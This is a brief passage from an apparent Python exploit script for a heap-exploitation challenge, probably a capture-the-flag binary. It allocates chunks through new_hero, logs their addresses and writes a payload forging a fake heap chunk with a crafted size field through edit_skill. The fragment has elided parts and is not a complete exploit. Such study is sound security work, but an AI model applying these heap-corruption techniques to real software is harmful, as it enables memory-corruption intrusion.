...
# x
x_sz = 0x100
idx_x, addr_x = new_hero(x_sz)
log.info(f"X: {idx_x} {addr_x:x}")

# a
a_sz = 0x38
idx_a, addr_a = new_hero(a_sz)
log.info(f"A: {idx_a} {addr_a:x}")
...
# create fake chunk
fk_sz = addr_b-0x10 - addr_x
payload = pad(p64(0x100)+p64(0x100)+p64(addr_a)*4, 0x38)[:-8] + p64(fk_sz)
edit_skill(idx_a,payload)
